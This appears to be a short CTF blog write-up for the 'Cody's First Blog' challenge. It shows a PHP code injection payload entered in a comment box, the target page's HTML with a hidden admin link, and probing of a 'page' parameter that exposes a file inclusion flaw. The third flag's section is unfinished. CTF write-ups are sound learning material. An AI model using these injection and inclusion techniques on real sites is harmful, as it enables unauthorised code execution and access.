---
date: "2019-05-12"
title: "Cody's First Blog"
category: "CTF"
---

CTF time !!
Let's find flags.
![alt text](https://media.giphy.com/media/sSmxfWnEVxtWU/giphy.gif)

### PHP File Inclusion Vulnerability ~ 🚩(1/3)
Simply by giving the input text (under 'Add comment' text area)
```php
<?php phpinfo(); ?>
```
Then we are able to do remote php code execution.
<br />
Flag captured !!

### PHP File Inclusion Vulnerability ~ 🚩(2/3)
Let's inspect the source HTML file
```html
<!doctype html>
<html>
	<head>
		<title>Home -- Cody's First Blog</title>
	</head>
	<body>
		<h1>Home</h1>
		<p>Welcome to my blog!  I'm excited to share my thoughts with the world.  I have many important and controversial positions, which I hope to get across here.</p>
    <h2>September 1, 2018 -- First</h2>
    <p>First post!  I built this blog engine around one basic concept: PHP doesn't need a template language because it <i>is</i> a template language.  This server can't talk to the outside world and nobody but me can upload files, so there's no risk in just using include().</p>
    <p>Stick around for a while and comment as much as you want; all thoughts are welcome!</p>
		<br>
		<br>
		<hr>
		<h3>Comments</h3>
		<!--<a href="?page=admin.auth.inc">Admin login</a>-->
		<h4>Add comment:</h4>
		<form method="POST">
			<textarea rows="4" cols="60" name="body"></textarea><br>
			<input type="submit" value="Submit">
		</form>
	</body>
</html>
```
There is a commented line, which tells us a potential open API endpoint.
> What if we send weird 'page' query server ? ex: http://35.196.135.216/ef0493ce62/?page=page

Then we got
```
Notice: Undefined variable: title in /app/index.php on line 30

Warning: include(page.php): failed to open stream: No such file or directory in /app/index.php on line 21

Warning: include(): Failed opening 'page.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /app/index.php on line 21
```

Ah ha !! This response is like a gold to attacker.
We just found a file inclusion vulnerability.
Let's try different potential file name combinations like 'admin.inc', 'admin', 'auth', 'inc'....

Under 'admin.inc' query id, clients will be redirected to an admin page showing all pending comments.
<br />
Flag captured !!

### PHP File Inclusion Vulnerability ~ 🚩(3/3)
Capturing...